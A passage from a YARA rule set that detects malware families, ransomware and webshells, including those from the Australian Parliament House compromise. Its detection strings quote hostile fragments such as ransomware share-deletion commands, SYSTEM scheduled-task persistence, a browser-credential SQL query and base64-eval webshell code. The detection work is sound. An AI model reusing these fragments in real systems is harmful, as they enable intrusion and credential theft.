filesize < 6000KB and 1 of them\n}\n\nrule MAL_QuasarRAT_May19_1_RID2E1E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects QuasarRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.ensilo.com/uncovering-new-activity-by-apt10\"\n      date = \"2019-05-27 11:00:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"0644e561225ab696a97ba9a77583dcaab4c26ef0379078c65f9ade684406eded\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Quasar.Common.Messages\" ascii fullword\n      $x2 = \"Client.MimikatzTools\" ascii fullword\n      $x3 = \"Resources.powerkatz_x86.dll\" ascii fullword\n      $x4 = \"Uninstalling... good bye :-(\" wide\n      $xc1 = { 41 00 64 00 6D 00 69 00 6E 00 00 11 73 00 63 00\n               68 00 74 00 61 00 73 00 6B 00 73 00 00 1B 2F 00\n               63 00 72 00 65 00 61 00 74 00 65 00 20 00 2F 00\n               74 00 6E 00 20 00 22 00 00 27 22 00 20 00 2F 00\n               73 } \n      $xc2 = { 00 70 00 69 00 6E 00 67 00 20 00 2D 00 6E 00 20\n               00 31 00 30 00 20 00 6C 00 6F 00 63 00 61 00 6C\n               00 68 00 6F 00 73 00 74 00 20 00 3E 00 20 00 6E\n               00 75 00 6C 00 0D 00 0A 00 64 00 65 00 6C 00 20\n               00 2F 00 61 00 20 00 2F 00 71 00 20 00 2F 00 66\n               00 20 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and 1 of them\n}\n\nrule APT_ATP28_Sofacy_Indicators_May19_1_RID3357 : APT DEMO EXE FILE G0007 RUSSIA {\n   meta:\n      description = \"Detects APT28 Sofacy indicators in samples\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1129647994603790338\"\n      date = \"2019-05-18 14:43:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"80548416ffb3d156d3ad332718ed322ef54b8e7b2cc77a7c5457af57f51d987a\"\n      hash2 = \"b40909ac0b70b7bd82465dfc7761a6b4e0df55b894dd42290e3f72cb4280fa44\"\n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"c:\\\\Users\\\\user\\\\Desktop\\\\openssl-1.0.1e_m\\\\/ssl/cert.pem\" ascii\n      $x2 = \"C:\\\\Users\\\\User\\\\Desktop\\\\Downloader_Poco\" ascii\n      $s1 = \"w%SystemRoot%\\\\System32\\\\npmproxy.dll\" fullword wide\n      $op0 = { e8 41 37 f6 ff 48 2b e0 e8 99 ff ff ff 48 8b d0 } \n      $op1 = { e9 34 3c e3 ff cc cc cc cc 48 8d 8a 20 } \n      $op2 = { e8 af bb ef ff b8 ff ff ff ff e9 f4 01 00 00 8b } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and ( pe.imphash ( ) == \"f4e1c3aaec90d5dfa23c04da75ac9501\" or 1 of ( $x* ) or ( $s1 and 2 of ( $op* ) ) )\n}\n\nrule MAL_RANSOM_RobinHood_May19_1_RID307D : CRIME DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects RobinHood Ransomware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/BThurstonCPTECH/status/1128489465327030277\"\n      date = \"2019-05-15 12:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"21cb84fc7b33e8e31364ff0e58b078db8f47494a239dc3ccbea8017ff60807e3\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".enc_robbinhood\" ascii\n      $s2 = \"c:\\\\windows\\\\temp\\\\pub.key\" ascii fullword\n      $s3 = \"cmd.exe /c net use * /DELETE /Y\" ascii\n      $s4 = \"sc.exe stop SQLAgent$SQLEXPRESS\" nocase\n      $s5 = \"main.EnableShadowFucks\" nocase\n      $s6 = \"main.EnableRecoveryFCK\" nocase\n      $s7 = \"main.EnableLogLaunders\" nocase\n      $s8 = \"main.EnableServiceFuck\" nocase\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and 1 of them\n}\n\nrule SUSP_OBFUSC_Base64_Hex_Encoded_Apr19_RID3342 : DEMO FILE OBFUS SUSP T1027 T1132_001 {\n   meta:\n      description = \"Detects hex encoded code that has been base64 encoded\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-04-29 14:40:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-12-01\"\n      tags = \"DEMO, FILE, OBFUS, SUSP, T1027, T1132_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = { 78 34 4e ?? ?? 63 65 44 ?? ?? 58 48 67 } \n      $x2 = { 63 45 44 ?? ?? 58 48 67 ?? ?? ?? 78 34 4e } \n      $fp1 = \"Microsoft Azure Code Signp$\" \n   condition: \n      1 of ( $x* ) and not 1 of ( $fp* )\n}\n\nrule APT_NK_BabyShark_KimJoingRAT_Apr19_1_RID339E : APT DEMO EXE FILE NK {\n   meta:\n      description = \"Detects BabyShark KimJongRAT\"\n      author = \"Florian Roth\"\n      reference = \"https://unit42.paloaltonetworks.com/babyshark-malware-part-two-attacks-continue-using-kimjongrat-and-pcrat/\"\n      date = \"2019-04-27 14:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d50a0980da6297b8e4cec5db0a8773635cee74ac6f5c1ff18197dfba549f6712\"\n      tags = \"APT, DEMO, EXE, FILE, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s\\\\Microsoft\\\\ttmp.log\" fullword wide\n      $a1 = \"logins.json\" fullword ascii\n      $s1 = \"https://www.google.com/accounts/servicelogin\" fullword ascii\n      $s2 = \"https://login.yahoo.com/config/login\" fullword ascii\n      $s3 = \"SELECT id, hostname, httpRealm, formSubmitURL, usernameField, passwordField, encryptedUsername, encryptedPassword FROM moz_login\" ascii\n      $s4 = \"\\\\mozsqlite3.dll\" ascii\n      $s5 = \"SMTP Password\" fullword ascii\n      $s6 = \"Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or ( $a1 and 3 of ( $s* ) ) )\n}\n\nrule APT_DNSpionage_Karkoff_Malware_Apr19_1_RID34E4 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects DNSpionage Karkoff malware\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html\"\n      date = \"2019-04-24 15:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6a251ed6a2c6a0a2be11f2a945ec68c814d27e2b6ef445f4b2c7a779620baa11\"\n      hash2 = \"b017b9fc2484ce0a5629ff1fed15bca9f62f942eafbb74da6a40f40337187b04\"\n      hash3 = \"5b102bf4d997688268bab45336cead7cdf188eb0d6355764e53b4f62e1cdf30c\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Karkoff.exe\" fullword wide\n      $x2 = \"kuternull.com\" fullword wide\n      $x3 = \"rimrun.com\" fullword wide\n      $s1 = \"C:\\\\Windows\\\\Temp\\\\\" wide\n      $s2 = \"CMD.exe\" fullword wide\n      $s3 = \"get_ProcessExtensionDataNames\" fullword ascii\n      $s4 = \"get_ProcessDictionaryKeys\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or all of ( $s* ) )\n}\n\nrule SUSP_DropperBackdoor_Keywords_RID3273 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects suspicious keywords that indicate a backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html\"\n      date = \"2019-04-24 14:05:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cd4b9d0f2d1c0468750855f0ed352c1ed6d4f512d66e0e44ce308688235295b5\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x4 = \"DropperBackdoor\" fullword wide ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them\n}\n\nrule SUSP_Netsh_PortProxy_Command_Apr19_RID33ED : DEMO SCRIPT SUSP T1016 {\n   meta:\n      description = \"Detects a suspicious command line with netsh and the portproxy command\"\n      author = \"Florian Roth\"\n      reference = \"https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy\"\n      date = \"2019-04-20 15:08:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-11-03\"\n      hash1 = \"9b33a03e336d0d02750a75efa1b9b6b2ab78b00174582a9b2cb09cd828baea09\"\n      tags = \"DEMO, SCRIPT, SUSP, T1016\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"netsh interface portproxy add v4tov4 listenport=\" ascii\n   condition: \n      1 of them\n}\n\nrule APT_APT34_PS_Malware_Apr19_1_RID3047 : APT DEMO G0049 G0057 MIDDLE_EAST SCRIPT T1059_001 {\n   meta:\n      description = \"Detects APT34 PowerShell malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/0xffff0800/status/1118406371165126656\"\n      date = \"2019-04-17 12:33:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b1d621091740e62c84fc8c62bcdad07873c8b61b83faba36097ef150fd6ec768\"\n      tags = \"APT, DEMO, G0049, G0057, MIDDLE_EAST, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"= get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID\" ascii\n      $x2 = \"Write-Host \\\"excepton occured!\\\"\" ascii\n      $s1 = \"Start-Sleep -s 1;\" fullword ascii\n      $s2 = \"Start-Sleep -m 100;\" fullword ascii\n   condition: \n      1 of ( $x* ) or 2 of them\n}\n\nrule APT_APT34_PS_Malware_Apr19_2_RID3048 : APT DEMO G0049 G0057 MIDDLE_EAST SCRIPT T1059_001 {\n   meta:\n      description = \"Detects APT34 PowerShell malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/0xffff0800/status/1118406371165126656\"\n      date = \"2019-04-17 12:33:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2943e69e6c34232dee3236ced38d41d378784a317eeaf6b90482014210fcd459\"\n      tags = \"APT, DEMO, G0049, G0057, MIDDLE_EAST, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"= \\\"http://\\\" + [System.Net.Dns]::GetHostAddresses(\\\"\" ascii\n      $x2 = \"$t = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID\" fullword ascii\n      $x3 = \"| Where { $_ -notmatch '^\\\\s+$' }\" ascii\n      $s1 = \"= new-object System.Net.WebProxy($u, $true);\" fullword ascii\n      $s2 = \" -eq \\\"dom\\\"){$\" ascii\n      $s3 = \" -eq \\\"srv\\\"){$\" ascii\n      $s4 = \"+\\\"<>\\\" | Set-Content\" ascii\n   condition: \n      1 of ( $x* ) and 3 of them\n}\n\nrule APT_APT34_PS_Malware_Apr19_3_RID3049 : APT DEMO G0049 G0057 MIDDLE_EAST SCRIPT T1053_005 T1059_001 {\n   meta:\n      description = \"Detects APT34 PowerShell malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/0xffff0800/status/1118406371165126656\"\n      date = \"2019-04-17 12:33:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14ed\"\n      tags = \"APT, DEMO, G0049, G0057, MIDDLE_EAST, SCRIPT, T1053_005, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Powershell.exe -exec bypass -file ${global:$address1}\" \n      $x2 = \"schtasks /create /F /ru SYSTEM /sc minute /mo 10 /tn\" \n      $x3 = \"\\\"\\\\UpdateTasks\\\\UpdateTaskHosts\\\"\" \n      $x4 = \"wscript /b \\\\`\\\"${global:$address1\" ascii\n      $x5 = \"::FromBase64String([string]${global:$http_ag}))\" ascii\n      $x6 = \".run command1, 0, false\\\" | Out-File \" ascii\n      $x7 = \"\\\\UpdateTask.vbs\" ascii\n      $x8 = \"hUpdater.ps1\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_1_RID33F3 : APT DEMO G0032 MAL NK {\n   meta:\n      description = \"Detects HOPLIGHT malware used by HiddenCobra APT group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/analysis-reports/AR19-100A\"\n      date = \"2019-04-13 15:09:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d77fdabe17cdba62a8e728cbe6c740e2c2e541072501f77988674e07a05dfb39\"\n      tags = \"APT, DEMO, G0032, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"www.naver.com\" fullword ascii\n      $s2 = \"PolarSSL Test CA0\" fullword ascii\n   condition: \n      filesize < 1000KB and all of them\n}\n\nrule APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_2_RID33F4 : APT DEMO EXE FILE G0032 MAL NK T1543_003 {\n   meta:\n      description = \"Detects HOPLIGHT malware used by HiddenCobra APT group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/analysis-reports/AR19-100A\"\n      date = \"2019-04-13 15:09:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"70034b33f59c6698403293cdc28676c7daa8c49031089efa6eefce41e22dccb3\"\n      tags = \"APT, DEMO, EXE, FILE, G0032, MAL, NK, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k mdnetuse\" fullword ascii\n      $s2 = \"%s\\\\hid.dll\" fullword ascii\n      $s3 = \"%Systemroot%\\\\System32\\\\\" ascii\n      $s4 = \"SYSTEM\\\\CurrentControlSet\\\\services\\\\%s\\\\Parameters\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_3_RID33F5 : APT DEMO EXE FILE G0032 MAL NK {\n   meta:\n      description = \"Detects HOPLIGHT malware used by HiddenCobra APT group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/analysis-reports/AR19-100A\"\n      date = \"2019-04-13 15:10:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2151c1977b4555a1761c12f151969f8e853e26c396fa1a7b74ccbaf3a48f4525\"\n      hash2 = \"05feed9762bc46b47a7dc5c469add9f163c16df4ddaafe81983a628da5714461\"\n      hash3 = \"ddea408e178f0412ae78ff5d5adf2439251f68cad4fd853ee466a3c74649642d\"\n      tags = \"APT, DEMO, EXE, FILE, G0032, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Oleaut32.dll\" fullword ascii\n      $s2 = \"Process32NextA\" fullword ascii\n      $s3 = \"Process32FirstA\" fullword ascii\n      $s4 = \"%sRSA key size  : %d bits\" fullword ascii\n      $s5 = \"emailAddress=\" fullword ascii\n      $s6 = \"%scert. version : %d\" fullword ascii\n      $s7 = \"www.naver.com\" fullword ascii\n      $x1 = \"ztretrtireotreotieroptkierert\" fullword ascii\n      $x2 = \"reykfgkodfgkfdskgdfogpdokgsdfpg\" fullword ascii\n      $x3 = \"fjiejffndxklfsdkfjsaadiepwn\" fullword ascii\n      $x4 = \"fgwljusjpdjah\" fullword ascii\n      $x5 = \"udbcgiut.dat\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( 1 of ( $x* ) or 6 of ( $s* ) )\n}\n\nrule MAL_Ransomware_Wadhrama_RID2FED : CRIME DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects Wadhrama Ransomware via Imphash\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-04-07 12:18:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"557c68e38dce7ea10622763c10a1b9f853c236b3291cd4f9b32723e8714e5576\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and pe.imphash ( ) == \"f86dec4a80961955a89e7ed62046cc0e\"\n}\n\nrule SUSP_RAR_with_PDF_Script_Obfuscation_RID34A4 : DEMO FILE OBFUS SCRIPT SUSP {\n   meta:\n      description = \"Detects RAR file with suspicious .pdf extension prefix to trick users\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-04-06 15:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b629b46b009a1c2306178e289ad0a3d9689d4b45c3d16804599f23c90c6bca5b\"\n      tags = \"DEMO, FILE, OBFUS, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".pdf.vbe\" ascii\n      $s2 = \".pdf.vbs\" ascii\n      $s3 = \".pdf.ps1\" ascii\n      $s4 = \".pdf.bat\" ascii\n      $s5 = \".pdf.exe\" ascii\n   condition: \n      uint32 ( 0 ) == 0x21726152 and 1 of them\n}\n\nrule SUSP_Just_EICAR_RID2C24 : DEMO FILE SUSP {\n   meta:\n      description = \"Just an EICAR test file - this is boring stuff\"\n      author = \"Florian Roth\"\n      reference = \"http://2016.eicar.org/85-0-Download.html\"\n      date = \"2019-03-24 09:36:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x3558 and filesize < 70 and $s1 at 0\n}\n\nrule Ransom_LockerGoga_Mar19_1_RID3037 : CRIME DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects LockerGoga ransomware binaries\"\n      author = \"Florian Roth\"\n      reference = \"https://www.nrk.no/norge/skreddersydd-dobbeltangrep-mot-hydro-1.14480202\"\n      date = \"2019-03-19 12:30:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c97d9bbc80b573bdeeda3812f4d00e5183493dd0d5805e2508728f65977dda15\"\n      hash2 = \"7bcd69b3085126f7e97406889f78ab74e87230c11812b79406d723a80c08dd26\"\n      hash3 = \"bdf36127817413f625d2625d3133760af724d6ad2410bea7297ddc116abc268f\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\.(doc|dot|wbk|docx|dotx|docb|xlm|xlsx|xltx|xlsb|xlw|ppt|pot|pps|pptx|potx|ppsx|sldx|pdf)\" wide\n      $x2 = \"|[A-Za-z]:\\\\cl.log\" wide\n      $x4 = \"\\\\crypto-locker\\\\\" ascii\n      $xc1 = { 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E\n               00 61 00 6D 00 65 00 00 00 00 00 4D 00 6C 00 63\n               00 72 00 6F 00 73 00 6F 00 66 00 74 } \n      $xc2 = { 00 2E 00 6C 00 6F 00 63 00 6B 00 65 00 64 00 00\n               00 20 46 41 49 4C 45 44 20 00 00 00 00 20 00 00\n               00 20 75 6E 6B 6E 6F 77 6E 20 65 78 63 65 70 74\n               69 6F 6E } \n      $rn1 = \"This may lead to the impossibility of recovery of the certain files.\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 1 of ( $x* ) ) or $rn1\n}\n\nrule MAL_CMD_Script_Obfuscated_Feb19_1_RID32B7 : DEMO FILE MAL OBFUS SCRIPT T1059 {\n   meta:\n      description = \"Detects obfuscated batch script using env variable sub-strings\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/DbgShell/status/1101076457189793793\"\n      date = \"2019-03-01 14:17:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"deed88c554c8f9bef4078e9f0c85323c645a52052671b94de039b438a8cff382\"\n      tags = \"DEMO, FILE, MAL, OBFUS, SCRIPT, T1059\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = { 40 65 63 68 6F 20 6F 66 66 0D 0A 73 65 74 20 } \n      $s1 = { 2C 31 25 0D 0A 65 63 68 6F 20 25 25 } \n   condition: \n      uint16 ( 0 ) == 0x6540 and filesize < 200KB and $h1 at 0 and uint16 ( filesize - 3 ) == 0x0d25 and uint8 ( filesize - 1 ) == 0x0a and $s1 in ( filesize - 200 .. filesize )\n}\n\nrule HKTL_Dsniff_RID2AFD : APT DEMO HKTL {\n   meta:\n      description = \"Detects Dsniff hack tool\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/faq-the-projectsauron-apt/75533/\"\n      date = \"2019-02-19 08:47:21\"\n      score = 55\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*\" \n   condition: \n      1 of them\n}\n\nrule APT_WebShell_Tiny_1_RID2DFE : APT DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detetcs a tiny webshell involved in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 10:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"eval(\" ascii wide\n   condition: \n      ( uint16 ( 0 ) == 0x3f3c or uint16 ( 0 ) == 0x253c ) and filesize < 40 and $x1\n}\n\nrule APT_WebShell_AUS_Tiny_2_RID2F47 : APT DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detetcs a tiny webshell involved in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 11:50:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0d6209d86f77a0a69451b0f27b476580c14e0cda15fa6a5003aab57a93e7e5a5\"\n      tags = \"APT, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Request.Item[System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\\\"[password]\\\"))];\" ascii\n      $x2 = \"eval(arguments,System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\\\"\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3f3c or uint16 ( 0 ) == 0x253c ) and filesize < 1KB and 1 of them\n}\n\nrule APT_WebShell_AUS_JScript_3_RID3063 : APT DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detetcs a webshell involved in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 12:37:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7ac6f973f7fccf8c3d58d766dec4ab7eb6867a487aa71bc11d5f05da9322582d\"\n      tags = \"APT, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<%@ Page Language=\\\"Jscript\\\" validateRequest=\\\"false\\\"%><%try{eval(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String\" ascii\n      $s2 = \".Item[\\\"[password]\\\"])),\\\"unsafe\\\");}\" ascii\n   condition: \n      uint16 ( 0 ) == 0x6568 and filesize < 1KB and all of them\n}\n\nrule APT_WebShell_AUS_4_RID2D46 : APT DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detetcs a webshell involved in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 10:24:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"83321c02339bb51735fbcd9a80c056bd3b89655f3dc41e5fef07ca46af09bb71\"\n      tags = \"APT, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wProxy.Credentials = new System.Net.NetworkCredential(pusr, ppwd);\" fullword ascii\n      $s2 = \"{return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\" ascii\n      $s3 = \".Equals('User-Agent', StringComparison.OrdinalIgnoreCase))\" ascii\n      $s4 = \"gen.Emit(System.Reflection.Emit.OpCodes.Ret);\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x7566 and filesize < 10KB and 3 of them\n}\n\nrule APT_Script_AUS_4_RID2CA5 : APT DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detetcs a script involved in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 09:58:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fdf15f388a511a63fbad223e6edb259abdd4009ec81fcc87ce84f0f2024c8057\"\n      tags = \"APT, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"myMutex = CreateMutex(0, 1, \\\"teX23stNew\\\")\" fullword ascii\n      $x2 = \"mmpath = Environ(appdataPath) & \\\"\\\\\\\" & \\\"Microsoft\\\" & \\\"\\\\\\\" & \\\"mm.accdb\\\"\" fullword ascii\n      $x3 = \"Dim mmpath As String, newmmpath  As String, appdataPath As String\" fullword ascii\n      $x4 = \"'MsgBox \\\"myMutex Created\\\" Do noting\" fullword ascii\n      $x5 = \"appdataPath = \\\"app\\\" & \\\"DatA\\\"\" fullword ascii\n      $x6 = \".DoCmd.Close , , acSaveYes\" fullword ascii\n   condition: \n      filesize < 7KB and 1 of them\n}\n\nrule APT_WebShell_AUS_5_RID2D47 : APT DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detetcs a webshell involved in the Australian Parliament House network compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1097423665472376832\"\n      date = \"2019-02-18 10:25:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"54a17fb257db2d09d61af510753fd5aa00537638a81d0a8762a5645b4ef977e4\"\n      tags = \"APT, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"function DEC(d){return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(d));}\" fullword ascii\n      $a2 = \"function ENC(d){return Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(d));}\" fullword ascii\n      $s1 = \"var hash=DEC(Request.Item['\" ascii\n      $s2 = 